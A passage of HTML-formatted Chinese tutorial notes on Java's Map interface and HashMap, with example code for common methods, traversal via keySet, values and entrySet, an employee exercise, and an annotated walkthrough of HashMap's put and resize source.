class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//接口实现类的特点，使用实现类HashMap</span><br><span class="hljs-comment">//1.Map与Collection并列存在。用于保存具有映射关系的数据：Key-Value（双列元素）</span><br><span class="hljs-comment">//2.Map中的key和 value 可以是任何引用类型的数据，会封装到HashMap＄Node对象中（详见于debug）</span><br><span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>map.put(<span class="hljs-string">&quot;no1&quot;</span>, <span class="hljs-string">&quot;韩顺平&quot;</span>); <span class="hljs-comment">//k-v</span><br>map.put(<span class="hljs-string">&quot;no2&quot;</span>, <span class="hljs-string">&quot;张无忌&quot;</span>); <span class="hljs-comment">//k-v</span><br>System.out.println(map); <span class="hljs-comment">//&#123;no2=张无忌, no1=张无忌&#125;  ，输出顺序和加入顺序不同</span><br><span class="hljs-comment">//3.Map中的key不允许重复（原因和HashSet 一样，前面分析过源码）</span><br>map.put(<span class="hljs-string">&quot;no1&quot;</span>, <span class="hljs-string">&quot;张无忌&quot;</span>); <span class="hljs-comment">//key重复，新值替换旧值</span><br>System.out.println(map); <span class="hljs-comment">//输出&#123;no2=张无忌, no1=张无忌&#125;</span><br><span class="hljs-comment">//4.Map中的value 可以重复</span><br>map.put(<span class="hljs-string">&quot;no3&quot;</span>, <span class="hljs-string">&quot;张无忌&quot;</span>); <span class="hljs-comment">//key不同，value相同，也可以存放</span><br>System.out.println(map); <span class="hljs-comment">//&#123;no2=张无忌, no1=张无忌, no3=张无忌&#125;</span><br><span class="hljs-comment">//5.Map的key 可以为 null，但只能有一个</span><br><span class="hljs-comment">//      value 为null，可以多个.</span><br>map.put(<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>);<br>map.put(<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;abc&quot;</span>); <span class="hljs-comment">//替换</span><br>map.put(<span class="hljs-string">&quot;no4&quot;</span>,<span class="hljs-literal">null</span>);<br>map.put(<span class="hljs-string">&quot;no5&quot;</span>,<span class="hljs-literal">null</span>);<br>System.out.println(map);<br><span class="hljs-comment">//&#123;no2=张无忌, null=abc, no1=张无忌, no4=null, no3=张无忌, no5=null&#125;</span><br><span class="hljs-comment">//6.常用String类作为Map的 key （其他的类型也可以）</span><br>map.put(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;赵敏&quot;</span>);<br>map.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(),<span class="hljs-string">&quot;金毛狮王&quot;</span>);<br>System.out.println(map);<br><span class="hljs-comment">//7.key 和 value 之间存在单向一对一关系，即通过指定的key 总能找到对应的 value</span><br><span class="hljs-comment">//通过get方法，传入key，会返回对应的value</span><br>System.out.println(map.get(<span class="hljs-string">&quot;no2&quot;</span>)); <span class="hljs-comment">//张无忌</span><br></code></pre></td></tr></table></figure><p>案例(8):</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>map.put(<span class="hljs-string">&quot;no1&quot;</span>, <span class="hljs-string">&quot;韩顺平&quot;</span>); <span class="hljs-comment">//k-v</span><br>map.put(<span class="hljs-string">&quot;no2&quot;</span>, <span class="hljs-string">&quot;张无忌&quot;</span>); <span class="hljs-comment">//k-v</span><br><span class="hljs-type">Set</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> map.entrySet();<br>System.out.println(set.getClass());<br><span class="hljs-keyword">for</span> (Object obj: set)&#123;<br>    <span class="hljs-comment">//先做一个向下转型</span><br>    Map.<span class="hljs-type">Entry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> (Map.Entry) obj;<br>    System.out.println(entry.getKey()+<span class="hljs-string">&quot;-&quot;</span>+entry.getValue());<br>    <span class="hljs-comment">//输出：</span><br>    <span class="hljs-comment">//no2-张无忌</span><br>    <span class="hljs-comment">//no1-韩顺平</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Map接口常用方法"><a href="#Map接口常用方法" class="headerlink" title="Map接口常用方法"></a>Map接口常用方法</h3><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230305031504111.png" alt="image-20230305031504111"></p><ol><li>put:添加</li><li>remove:根据键删除映射关系 </li><li>get:根据键获取值</li><li>size:获取元素个数 </li><li>isEmpty:判断个数是否为0</li><li>clear:清除</li><li>containsKey:查找键是否存在</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-comment">//Map接口常用方法</span><br><span class="hljs-comment">//        1.  put:添加</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;邓超&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">100</span>));<br>        map.put(<span class="hljs-string">&quot;邓超&quot;</span>,<span class="hljs-string">&quot;孙俪&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;王宝强&quot;</span>,<span class="hljs-string">&quot;马蓉&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;宋喆&quot;</span>,<span class="hljs-string">&quot;马蓉&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;刘令博&quot;</span>,<span class="hljs-literal">null</span>);<br>        map.put(<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;刘亦菲&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;鹿晗&quot;</span>,<span class="hljs-string">&quot;关晓婷&quot;</span>);<br>        System.out.println(map);<br>        <span class="hljs-comment">//&#123;邓超=孙俪, 宋喆=马蓉, 刘令博=null, null=刘亦菲, 王宝强=马蓉, 鹿晗=关晓婷&#125;</span><br><br><span class="hljs-comment">//        2. remove:根据键删除映射关系</span><br>        map.remove(<span class="hljs-literal">null</span>);<br>        System.out.println(map); <span class="hljs-comment">//&#123;邓超=孙俪, 宋喆=马蓉, 刘令博=null, 王宝强=马蓉, 鹿晗=关晓婷&#125;</span><br><span class="hljs-comment">//        3. get:根据键获取值</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> map.get(<span class="hljs-string">&quot;鹿晗&quot;</span>);<br>        System.out.println(val); <span class="hljs-comment">//关晓彤</span><br><span class="hljs-comment">//        4. size:获取元素个数</span><br>        System.out.println(map.size()); <span class="hljs-comment">//5</span><br><span class="hljs-comment">//        5. isEmpty:判断个数是否为0</span><br>        System.out.println(map.isEmpty()); <span class="hljs-comment">//false</span><br><span class="hljs-comment">//        6. clear:清除</span><br>        map.clear();<br>        System.out.println(map); <span class="hljs-comment">//&#123;&#125;</span><br><span class="hljs-comment">//        7. containsKey:查找键是否存在</span><br>        System.out.println(map.containsKey(<span class="hljs-string">&quot;hsp&quot;</span>)); <span class="hljs-comment">//false</span><br>        map.put(<span class="hljs-string">&quot;hsp&quot;</span>,<span class="hljs-number">123</span>);<br>        System.out.println(map.containsKey(<span class="hljs-string">&quot;hsp&quot;</span>)); <span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><h3 id="Map接口遍历方法"><a href="#Map接口遍历方法" class="headerlink" title="Map接口遍历方法"></a>Map接口遍历方法</h3><ol><li>containsKey:查找键是否存在</li><li>keySet:获取所有的键 </li><li>entrySet:获取所有关系k-v</li><li>values:获取所有的值</li></ol><p>几种遍历方法：</p><p>第一种：先取出所有的Key，通过Key取出对应的Value</p><p>第二种：取出所有的value</p><p>第三种：通过EntrySet 来获取K-V</p><p>案例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    map.put(<span class="hljs-string">&quot;邓超&quot;</span>, <span class="hljs-string">&quot;孙俪&quot;</span>);<br>    map.put(<span class="hljs-string">&quot;王宝强&quot;</span>, <span class="hljs-string">&quot;马蓉&quot;</span>);<br>    map.put(<span class="hljs-string">&quot;宋喆&quot;</span>, <span class="hljs-string">&quot;马蓉&quot;</span>);<br>    map.put(<span class="hljs-string">&quot;刘令博&quot;</span>, <span class="hljs-literal">null</span>);<br>    map.put(<span class="hljs-literal">null</span>, <span class="hljs-string">&quot;刘亦菲&quot;</span>);<br>    map.put(<span class="hljs-string">&quot;鹿晗&quot;</span>, <span class="hljs-string">&quot;关晓婷&quot;</span>);<br><br>    <span class="hljs-comment">//第一组：先取出所有的Key，通过Key取出对应的Value</span><br>    <span class="hljs-type">Set</span> <span class="hljs-variable">keyset</span> <span class="hljs-operator">=</span> map.keySet();<br>    <span class="hljs-comment">//1.增强for</span><br>    System.out.println(<span class="hljs-string">&quot;----第一钟方式----&quot;</span>);<br>    <span class="hljs-keyword">for</span> (Object key : keyset) &#123;<br>        System.out.println(key + <span class="hljs-string">&quot;-&quot;</span> + map.get(key));<br>    &#125;<br>    <span class="hljs-comment">//2.迭代器</span><br>    System.out.println(<span class="hljs-string">&quot;----第二钟方式----&quot;</span>);<br>    <span class="hljs-type">Iterator</span> <span class="hljs-variable">iterator</span> <span class="hljs-operator">=</span> keyset.iterator();<br>    <span class="hljs-keyword">while</span> (iterator.hasNext()) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> iterator.next();<br>        System.out.println(key + <span class="hljs-string">&quot;-&quot;</span> + map.get(key));<br>    &#125;<br><br>    <span class="hljs-comment">//第二组：取出所有的value</span><br>    <span class="hljs-type">Collection</span> <span class="hljs-variable">values</span> <span class="hljs-operator">=</span> map.values();<br>    <span class="hljs-comment">//这里可以使用Collection使用的遍历（两种）：增强for、迭代器（无法用get()所以不能使用普通for）</span><br>    <span class="hljs-comment">//例如：增强for</span><br>    System.out.println(<span class="hljs-string">&quot;----取出所有的value----&quot;</span>);<br>    <span class="hljs-keyword">for</span> (Object value : values) &#123;<br>        System.out.println(value);<br>    &#125;<br><br>    <span class="hljs-comment">//第三组：通过EntrySet 来获取K-V</span><br>    <span class="hljs-type">Set</span> <span class="hljs-variable">entrySet</span> <span class="hljs-operator">=</span> map.entrySet(); <span class="hljs-comment">//EntrySet&lt;Map.Entry&lt;K,V&gt;&gt;</span><br>    <span class="hljs-comment">//（1）增强for</span><br>    System.out.println(<span class="hljs-string">&quot;----使用EntrySet的增强for----&quot;</span>);<br>    <span class="hljs-keyword">for</span> (Object entry : entrySet) &#123;<br>        <span class="hljs-comment">//将entry转成Map.Entry</span><br>        Map.<span class="hljs-type">Entry</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> (Map.Entry) entry;<br>        System.out.println(m.getKey()+<span class="hljs-string">&quot;-&quot;</span>+m.getValue());<br>    &#125;<br>    <span class="hljs-comment">//(2)迭代器</span><br>    System.out.println(<span class="hljs-string">&quot;----使用EntrySet的迭代器----&quot;</span>);<br>    <span class="hljs-type">Iterator</span> <span class="hljs-variable">iterator1</span> <span class="hljs-operator">=</span> entrySet.iterator();<br>    <span class="hljs-keyword">while</span> (iterator1.hasNext()) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> iterator1.next();<br>        <span class="hljs-comment">//向下转型 Map.Entry</span><br>        Map.<span class="hljs-type">Entry</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> (Map.Entry) entry;<br>        System.out.println(m.getKey()+<span class="hljs-string">&quot;-&quot;</span>+m.getValue());<br>    &#125;<br></code></pre></td></tr></table></figure><p>遍历的结果：</p><blockquote><p>邓超-孙俪<br>宋喆-马蓉<br>刘令博-null<br>null-刘亦菲<br>王宝强-马蓉<br>鹿晗-关晓婷</p></blockquote><h3 id="练习-5"><a href="#练习-5" class="headerlink" title="练习"></a>练习</h3><blockquote><p>MapExercise.java<br>使用HashMap添加3个员工对象，要求<br>键：员工id<br>值:员工对象</p><p>并遍历显示工资＞18000的员工（遍历方式最少两种）员工类：姓名、工资、员工id</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//        使用HashMap添加3个员工对象，要求</span><br><span class="hljs-comment">//        键：员工id</span><br><span class="hljs-comment">//        值:员工对象</span><br><span class="hljs-comment">//        并遍历显示工资＞18000的员工（遍历方式最少两种）员工类：姓名、工资、员工id</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-number">100001</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>(<span class="hljs-string">&quot;jack&quot;</span>,<span class="hljs-number">12000.0</span>,<span class="hljs-number">100001</span>));<br>        map.put(<span class="hljs-number">100002</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>(<span class="hljs-string">&quot;john&quot;</span>,<span class="hljs-number">30000.0</span>,<span class="hljs-number">100001</span>));<br>        map.put(<span class="hljs-number">100003</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>(<span class="hljs-string">&quot;pat&quot;</span>,<span class="hljs-number">10000.0</span>,<span class="hljs-number">100001</span>));<br>        map.put(<span class="hljs-number">100004</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>(<span class="hljs-string">&quot;smith&quot;</span>,<span class="hljs-number">24000.0</span>,<span class="hljs-number">100001</span>));<br><br>        <span class="hljs-comment">//方法1：取出key  —— 使用keySet</span><br>        System.out.println(<span class="hljs-string">&quot;-----方法1keySet------&quot;</span>);<br>        <span class="hljs-type">Set</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> map.keySet();<br>        <span class="hljs-keyword">for</span> (Object key : set) &#123;<br>            <span class="hljs-comment">//向下转型，获取value</span><br>            <span class="hljs-type">Employee</span> <span class="hljs-variable">emp</span> <span class="hljs-operator">=</span> (Employee) map.get(key);<br>            <span class="hljs-keyword">if</span> (emp.getSal()&gt;<span class="hljs-number">18000</span>)&#123;<br>                System.out.println(emp);<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//方法2： 使用EntrySet ---迭代器</span><br>        System.out.println(<span class="hljs-string">&quot;-----方法2EntrySet ------&quot;</span>);<br>        <span class="hljs-type">Set</span> <span class="hljs-variable">entryset</span> <span class="hljs-operator">=</span> map.entrySet();<br>        <span class="hljs-type">Iterator</span> <span class="hljs-variable">iterator</span> <span class="hljs-operator">=</span> entryset.iterator();<br>        <span class="hljs-keyword">while</span> (iterator.hasNext()) &#123;<br>            Map.<span class="hljs-type">Entry</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> (Map.Entry) iterator.next();<br>            <span class="hljs-comment">//通过entry 取得key和value</span><br>            <span class="hljs-type">Employee</span> <span class="hljs-variable">emp</span> <span class="hljs-operator">=</span> (Employee) m.getValue();<br>            <span class="hljs-keyword">if</span> (emp.getSal()&gt;<span class="hljs-number">18000</span>)&#123;<br>                System.out.println(emp);<br>            &#125;<br>        &#125;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> sal;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> no;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Employee</span><span class="hljs-params">(String name, <span class="hljs-type">double</span> sal, <span class="hljs-type">int</span> no)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.sal = sal;<br>        <span class="hljs-built_in">this</span>.no = no;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;姓名：&quot;</span>+name+<span class="hljs-string">&quot; 工资：&quot;</span>+sal +<span class="hljs-string">&quot; 员工id：&quot;</span>+no;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getSal</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> sal;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>数据被包裹了好几层。</p><p>先是K-V包裹在Node结点，再把Node包裹到EntrySet。</p><p>取出时，先取出Node，再取出employee，最后再取出employee中的数据。</p><h2 id="11-HashMap"><a href="#11-HashMap" class="headerlink" title="11.HashMap"></a>11.HashMap</h2><h3 id="HashMap小结"><a href="#HashMap小结" class="headerlink" title="HashMap小结"></a>HashMap小结</h3><ol><li><p>Map接口的常用实现类：<strong>HashMap、Hashtable和Properties</strong>。</p></li><li><p>HashMap是 Map 接口使用频率最高的实现类。</p></li><li><p>HashMap 是以key-val 对的方式来存储数据［案例 Entry］</p></li><li><p>key 不能重复，但是值可以重复，允许使用null键和null值。</p></li><li><p>如果添加相同的key，则会覆盖原来的key-val，等同于修改．</p><p>（key不会替换，val会替换）</p></li><li><p>与HashSet一样，不保证映射的顺序，因为底层是以hash表的方式来存储的．</p><p>（Jdk8 hashMap底层 数组+链表+红黑树）</p></li><li><p>HashMap没有实现同步，因此是线程不安全的（方法没有做同步互斥synchronized）</p></li></ol><h3 id="HashMap底层机制"><a href="#HashMap底层机制" class="headerlink" title="HashMap底层机制"></a>HashMap底层机制</h3><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230305213233217.png" alt="image-20230305213233217"></p><ol><li>（k，v） 是一个Node 实现了Map.Entry＜K，V＞，查看 HashMap的源码可以看到.</li><li>jdk7.0的hashmap 底层实现［数组＋链表］，jdk8.0 底层［数组＋链表＋红黑树］</li></ol><p><strong>⭐️结论</strong></p><p>1）HashMap底层维护了Node类型的数组table，默认为null</p><p>2）当创建对象时，将加载因子（loadfactor）初始化为0.75. （临界值）</p><p>3）当添加key-val时，通过<strong>key</strong>的哈希值得到在table的索引。然后判断<strong>该索引处是否有元素</strong></p><ul><li>如果没有元素直接添加。</li><li>如果该索引处有元素，继续判断该元素的key<strong>是否和准备加入的key相等</strong>。<ul><li>如果相等，则直接替换val；</li><li>如果不相等需要判断是树结构还是链表结构，做出相应处理。</li></ul></li><li>如果添加时发现容量不够，则需要扩容。</li></ul><p>4）第1次添加，则需要扩容table容量为16，临界值（threshold）为12.</p><p>5）以后再扩容，则需要扩容table容量为原来的2倍（32），临界值为原来的2倍，即24（32✖️0.75），依次类推． </p><p>6）在Java8中，如果一条链表的<strong>元素个数超过 TREEIFY THRESHOLD</strong>（默认是8），并<strong>且table的大小＞＝MIN TREEIFY_CAPACITY</strong>（默认64），就会进行树化（红黑树）</p><h3 id="HashMap源码解读"><a href="#HashMap源码解读" class="headerlink" title="HashMap源码解读"></a>HashMap源码解读</h3><p>（和前面HashSet区别不大）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(); <span class="hljs-comment">//①</span><br>map.put(<span class="hljs-string">&quot;java&quot;</span>,<span class="hljs-number">10</span>); <span class="hljs-comment">//ok     //②</span><br>map.put(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-number">10</span>); <span class="hljs-comment">//ok</span><br>map.put(<span class="hljs-string">&quot;java&quot;</span>,<span class="hljs-number">20</span>); <span class="hljs-comment">//替换value //③</span><br></code></pre></td></tr></table></figure><p>① 执行构造器，初始化加载因子loadfactor（0.75）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">HashMap</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">this</span>.loadFactor = DEFAULT_LOAD_FACTOR; <span class="hljs-comment">// all other fields defaulted</span><br>&#125;<br></code></pre></td></tr></table></figure><p>HashMap$Node[] table &#x3D;null;</p><p>②执行put，先装箱，再调用put()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>    <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>hash()算法：计算key的哈希值，右移16位，按位异或</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-type">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>重点的putVal()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> V <span class="hljs-title function_">putVal</span><span class="hljs-params">(<span class="hljs-type">int</span> hash, K key, V value, <span class="hljs-type">boolean</span> onlyIfAbsent,</span><br><span class="hljs-params">               <span class="hljs-type">boolean</span> evict)</span> &#123;<br>    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="hljs-type">int</span> n, i;<br>    <span class="hljs-keyword">if</span> ((tab = table) == <span class="hljs-literal">null</span> || (n = tab.length) == <span class="hljs-number">0</span>) <span class="hljs-comment">//判断是否为空，空的话进行扩容（见resize())</span><br>        n = (tab = resize()).length; <span class="hljs-comment">//n=16</span><br>    <span class="hljs-keyword">if</span> ((p = tab[i = (n - <span class="hljs-number">1</span>) &amp; hash]) == <span class="hljs-literal">null</span>) <span class="hljs-comment">//取出hash值对应的table的索引位置的Node，如果为null，就直接把加入的k-v创建成一个Node，加入该位置</span><br>        tab[i] = newNode(hash, key, value, <span class="hljs-literal">null</span>); <span class="hljs-comment">//为空，所以创建一个新的结点，挂在这个位置上（案例为3）</span><br>    <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//不进入，省略</span><br>    &#125;<br>    ++modCount;  <br>    <span class="hljs-keyword">if</span> (++size &gt; threshold) <span class="hljs-comment">//判断size是否到临界值12</span><br>        resize(); <span class="hljs-comment">//如果大于，扩容</span><br>    afterNodeInsertion(evict); <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Resize()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> Node&lt;K,V&gt;[] resize() &#123;<br>    Node&lt;K,V&gt;[] oldTab = table;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">oldCap</span> <span class="hljs-operator">=</span> (oldTab == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : oldTab.length;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">oldThr</span> <span class="hljs-operator">=</span> threshold;  <br>    <span class="hljs-type">int</span> newCap, newThr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (oldCap &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">//不进入</span><br>        <span class="hljs-keyword">if</span> (oldCap &gt;= MAXIMUM_CAPACITY) &#123;<br>            threshold = Integer.MAX_VALUE;<br>            <span class="hljs-keyword">return</span> oldTab;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((newCap = oldCap &lt;&lt; <span class="hljs-number">1</span>) &lt; MAXIMUM_CAPACITY &amp;&amp;<br>                 oldCap &gt;= DEFAULT_INITIAL_CAPACITY)<br>            newThr = oldThr &lt;&lt; <span 